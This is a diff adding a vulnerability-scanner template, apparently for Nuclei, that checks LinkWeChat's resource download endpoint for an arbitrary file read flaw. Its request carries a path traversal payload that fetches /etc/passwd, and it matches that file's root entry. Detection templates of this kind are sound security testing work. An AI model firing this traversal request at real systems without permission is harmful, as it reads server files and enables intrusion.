@@ -1,0 +1,30 @@
+id: LinkWeChat-resource-lfi
+
+info:
+  name: LinkWeChat任意文件读取漏洞
+  author: Co5mos
+  severity: critical
+  description: |
+    LinkWeChat任意文件读取漏洞
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/linkwechat-api/common/download/resource?name=/profile/../../../../..{{file}}"
+    payloads:
+      file:
+        - /etc/passwd
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
